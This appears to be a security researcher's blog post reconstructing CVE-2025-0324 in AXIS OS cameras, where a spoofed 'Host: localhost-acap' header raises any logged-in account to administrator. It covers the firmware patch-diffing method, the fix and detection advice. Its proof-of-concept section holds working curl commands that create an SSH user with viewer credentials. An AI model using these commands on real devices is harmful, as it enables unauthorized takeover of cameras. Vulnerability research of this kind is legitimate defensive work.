---
title: "AXIS OS: A Spoofed Host Header Escalates Any Account to Administrator"
date: 2026-10-14
target: "Axis Communications (AXIS OS)"
severity: Critical
identifier: "CVE-2025-0324"
advisory_url: "https://nvd.nist.gov/vuln/detail/CVE-2025-0324"
fixed: "11.11.140 / 12.3.33"
fix: "Axis advisory (PDF)"
fix_url: "https://www.axis.com/dam/public/04/f3/1c/cve-2025-0324pdf-en-US-483807.pdf"
summary: "AXIS OS ships a custom Apache authorization module that grants every role it defines, administrator included, whenever the request's Host header resolves to the string localhost-acap. Apache runs with UseCanonicalName Off, so that value is whatever the client sent: any valid non-anonymous credential, down to viewer, becomes full administrator over the VAPIX Device Configuration API. Reconstructed from public firmware images (11.11.127 vs 11.11.181) and confirmed on hardware; fixed in AXIS OS 11.11.140 / 12.3.33."
---

## Summary

CVE-2025-0324 is a privilege escalation in the VAPIX Device Configuration
framework, the REST API family behind `/config/rest/*` on AXIS OS devices.
Axis disclosed it on 2025-06-02, scored it 9.4 Critical, credited it to
bug-bounty researcher Malacupa, and withheld the technical detail on purpose:
"Axis will not provide more detailed information about the vulnerability."

This post is the technical detail. I reconstructed the root cause by
patch-diffing two public AXIS OS firmware images (11.11.127 vulnerable vs
11.11.181 fixed), then confirmed it on a camera I own. No vendor source, no
insider information, just signed firmware that Axis distributes publicly.

The bug, in one sentence: the Apache authorization module that decides a
session's roles contains a shortcut for requests whose host resolves to the
string `localhost-acap`, and under Apache's default `UseCanonicalName Off`
that string is taken from the client's own `Host:` header. One header turns
any logged-in account, including the lowest-privileged `viewer` role, into a
full administrator.

The fix has been generally available since 2025-06-02 (AXIS OS LTS 2024
11.11.140 and Active Track 12.3.33). Nothing here is a live risk to patched
fleets; the point is to document what the advisory left out.

## Background

Recent AXIS OS builds expose the VAPIX Device Configuration framework under
`/config/rest/<api>/<version>/` (alias `/devconf/rest/`). It covers the
sensitive parts of a device: `ssh`, `firewall`, `snmp`, `cert`, `oidcsetup`,
and more, all enumerable by any authenticated user via
`GET /config/discover/apis`.

The request path is Apache in front of a Rust daemon:

```
Apache (Digest auth, TLS) --> mod_proxy over a Unix socket --> dev-conf-service
```

Apache gates the whole `/config` tree at the lowest role (`Require axis-group
viewer`) and leaves fine-grained authorization to the backend. The backend
learns who is calling from two headers that Apache injects and
unconditionally overwrites: `X-Remote-User` (the Digest-authenticated
username) and `X-Remote-User-Group` (a role bitmask). Spoofing those headers
directly from the client does nothing; Apache recomputes them on every
request.

So the interesting question is not whether a client can control the headers,
but whether a client can influence how Apache itself computes `USER_GROUPS`.
That is exactly where the bug lives.

## The vulnerability

Axis ships a custom Apache authorization provider,
`mod_authz_axisgroupfile.so`, that implements the `axis-group` require
directive and fills in `USER_GROUPS`. Reconstructed from the disassembly of
the 11.11.127 build, its logic looks like this:

```c
/* pseudocode, reconstructed from ARM64 disassembly */
static int is_trusted_local_acap_request(request_rec *r)
{
    const char *server_name = ap_get_server_name(r);
    ap_log_rerror(APLOG_MARK, APLOG_TRACE1, 0, r,
                  "ServerName is '%s'", server_name);
    return strcmp("localhost-acap", server_name) == 0;
}

int axis_group_authz_resolve(request_rec *r, const char *user, int64_t *out_group_bitmask)
{
    if (user != NULL && strcmp(user, "anonymous") != 0) {
        if (is_trusted_local_acap_request(r)) {
            *out_group_bitmask = 0xF;   /* admin | operator | viewer | ptz */
            return SUCCESS;             /* skip the real group file */
        }
        /* normal path: parse /etc/apache2/group_auth, build the real bitmask */
    }
    ...
}
```

Two things are wrong at once:

1. `ap_get_server_name()` is not a trustworthy value for a security
   decision. With `UseCanonicalName Off` (Apache's default, and the setting
   in effect on these devices), it returns the hostname from the client's
   `Host:` header, falling back to the connection's local IP only when no
   header is present at all. The client chooses it, request by request.
2. The shortcut does not grant one elevated role. `0xF` is the union of
   every role the module defines (`admin=1, operator=2, viewer=4, ptz=8`),
   so the session instantly holds all of them.

The check was presumably meant for trusted same-host callers, the kind of
local ACAP application that reaches the API through a loopback-only virtual
host name. Instead it hands the entire role set to anyone who can spell a
hostname.

### The fix

In 11.11.181 the same function computes `ap_auth_name(r)` instead, the
authentication realm configured for the matched `<Location>` block. That
value comes from server-side configuration only; no request header can
influence it. The comparison target changed accordingly:

```c
const char *realm = ap_auth_name(r);
ap_log_rerror(APLOG_MARK, APLOG_TRACE1, 0, r, "Auth realm is '%s'", realm);
return strcmp("VapixService", realm) == 0;
```

The same release added a second, unrelated hardening in `dev-conf-service`:
it now requires and sanity-checks an `X-Forwarded-For` header before trusting
`X-Remote-User` / `X-Remote-User-Group`. That looks like defense-in-depth
against a differently shaped bypass (an ingress path that skips the normal
proxy), not the primary fix; I could not find a live path it blocks.

On classification: this is best described as CWE-290 (Authentication Bypass
by Spoofing) composed with CWE-807 (Reliance on Untrusted Inputs in a
Security Decision). Axis's own CWE-791 (Incomplete Filtering of Special
Elements) is a defensible looser fit; the element that should have been kept
out of the trust decision is the Host header itself.

## How I found it: patch-diffing public firmware

The whole analysis started from public artifacts:

- **Firmware**: official signed images from Axis's unauthenticated
  distribution mirror (`ftp.axis.com/pub/axis/software/<model>/...`), last
  vulnerable build and first fixed build.
- **Extraction**: the `.bin` unpacks (gzip, then tar) into a manifest, a
  boot image, and `rootfs.img`, an unencrypted SquashFS 4.0 (zstd) volume.
  `unsquashfs` reads it directly. No signature bypass, no decryption.
- **Noise-aware diffing**: the two builds are eleven months apart, so almost
  every binary relinks with a new Build ID even when its logic is unchanged.
  A naive recursive diff is mostly churn. I triaged every candidate by file
  size and complete `strings` output before spending time on disassembly.
- **Disassembly**: radare2 (`aaa`, then `izz` / `axt` string
  cross-references) to find the functions touching changed strings, then
  instruction-by-instruction comparison. Both binaries are stripped ARM64;
  function boundaries came entirely from string xrefs and calling-convention
  reconstruction.

The module that mattered nearly escaped the filter:
`mod_authz_axisgroupfile.so` is byte-identical in size across both builds
(30,824 bytes). Only a full string-set diff exposed the substitution:

| | 11.11.127 (vulnerable) | 11.11.181 (fixed) |
|---|---|---|
| Host context API | `ap_get_server_name` | `ap_auth_name` |
| Trace log format | `ServerName is '%s'` | `Auth realm is '%s'` |
| Comparison value | `localhost-acap` | `VapixService` |

I also diffed the Apache vhost config and the D-Bus policy files to rule out
other paths, and tested several plausible alternates on live hardware:
direct spoofing of `X-Remote-User` (always overwritten), encoded-slash and
path-canonicalization tricks against the proxy, and the D-Bus policy
differences (unrelated interfaces). The identical-size module with a
different string table was what eventually pointed at the real bug.

## Proof of concept

All of this ran against my own camera on an isolated lab network, with a
disposable viewer-role account. Step one needs no state changes: the
firewall API returns a role-dependent object, so the same viewer credentials
plus one header reproduce the administrator view.

```bash
# Baseline: viewer, unmodified request
$ curl --digest -u viewer_test:<pw> http://<camera>/config/rest/firewall/v1beta
{"status":"success","data":{"conf":{"rules":{}}}}

# Same account, one added header
$ curl --digest -u viewer_test:<pw> -H "Host: localhost-acap" \
  http://<camera>/config/rest/firewall/v1beta
{"status":"success","data":{"activated":false,"conf":{"rules":{
  "activeDefaultPolicy":"ACCEPT","activeRules":[],
  "pendingDefaultPolicy":null,"pendingRules":[],"testTimeLeft":0}}}}
```

Step two removes any doubt that this is real authorization, not field
visibility. Creating an SSH user is an administrator-only operation:

```bash
# Baseline: viewer, unmodified request -> rejected
$ curl --digest -u viewer_test:<pw> -X POST \
  http://<camera>/config/rest/ssh/v1beta/users \
  -H "Content-Type: application/json" \
  -d '{"data":{"username":"poc_test","password":"<redacted>"}}'
HTTP/1.1 401 Unauthorized

# Same account, one added header -> 201 Created
$ curl --digest -u viewer_test:<pw> -H "Host: localhost-acap" -X POST \
  http://<camera>/config/rest/ssh/v1beta/users \
  -H "Content-Type: application/json" \
  -d '{"data":{"username":"poc_test","password":"<redacted>"}}'
HTTP/1.1 201 Created
```

The account was deleted as administrator immediately after the test. One
side effect worth flagging: creating the first SSH user this way silently
flips the global legacy switch `root.Network.SSH.Enabled` from `no` to
`yes`, which opens TCP/22 on the device. Deleting the user does not undo
it; the switch stays on until it is explicitly set back. So the practical
blast radius includes silently enabling a previously closed service.

There is no pre-authentication bypass. Without valid credentials, or with
the literal username `anonymous`, the request still gets 401 regardless of
the header, because the vulnerable branch is only reached after Apache has
resolved a real, non-anonymous `REMOTE_USER`.

That last point answers a scoring disagreement: Axis scored the CVE with
`PR:N` (no privileges, 9.4), NVD recomputed it as `PR:L` (low privileges,
8.8). Every path I found requires a valid non-anonymous session first, so
the evidence supports NVD's `PR:L`. It is a modest bar in practice: on
camera fleets the viewer role is routinely handed to VMS integrations and
semi-trusted third parties.

## Impact

An account at any role level can reach full administrative control of the
whole VAPIX Device Configuration surface:

- create administrator-controlled local SSH users (demonstrated), with the
  SSH-service side effect above, a direct path to a shell on the device;
- read and modify the firewall ruleset;
- manage TLS certificates and private key material through the `cert` API;
- touch `snmp` and `oidcsetup`, the integration credentials with monitoring
  and identity infrastructure;
- promote silently at fleet scale: a compromised VMS that holds per-camera
  viewer credentials can upgrade itself on every camera without ever
  touching an administrator account.

Because the flaw lives in a shared platform component rather than one API's
business logic, the same bypass should apply to every REST resource gated by
the `axis-group` provider, not only the two endpoints used here.

## Detection and remediation

- **Patch**: AXIS OS LTS 2024 `>= 11.11.140` or Active Track `>= 12.3.33`
  (or the earliest build after that point on your model's train).
- **Hunt**: on unpatched devices, requests to `/config/*` or `/devconf/*`
  carrying `Host: localhost-acap` from anything other than the device's own
  loopback are strong exploitation indicators. Most Apache configs do not
  log the Host header by default; add `%{Host}i` to the LogFormat where
  log storage allows.
- **Audit**: new local SSH users, firewall rules, or certificates that do
  not line up with an administrator login; unexpected changes predating the
  patch.
- **After patching**: rotate credentials at every role level, since a
  compromised viewer account had an unauditable path to admin until now.
- **Verify**: the repository below ships a read-only checker
  (`verify_cve_2025_0324.py`) that confirms exposure behaviorally in under a
  second without changing device state.

## Timeline

- 2025-06-02: Axis publishes the advisory and fixed builds (11.11.140 /
  12.3.33); NVD rescoring published the same day. No technical detail.
- 2026-08: patch-diff reconstruction and hardware confirmation.
- 2026-08-28: full report and verification tool published in the repository
  below.
- 2026-10-14: this condensed write-up.

## Credits and disclosure

- Original discovery and vendor report: **Malacupa**, via the AXIS OS Bug
  Bounty Program. All credit for finding the flaw belongs to Malacupa; this
  post only reconstructs what the advisory withheld.
- [Axis advisory (PDF)](https://www.axis.com/dam/public/04/f3/1c/cve-2025-0324pdf-en-US-483807.pdf)
  and [NVD record](https://nvd.nist.gov/vuln/detail/CVE-2025-0324).
- Full report, proof-of-concept tool, and firmware-diff artifacts:
  [kemrec/CVE-2025-0324-axis-vapix-privesc](https://github.com/kemrec/CVE-2025-0324-axis-vapix-privesc).

This is n-day research. The fix has been generally available for well over a
year, the CVE is public, and nothing here pre-empts a live disclosure. All
testing ran against hardware I own on an isolated network.
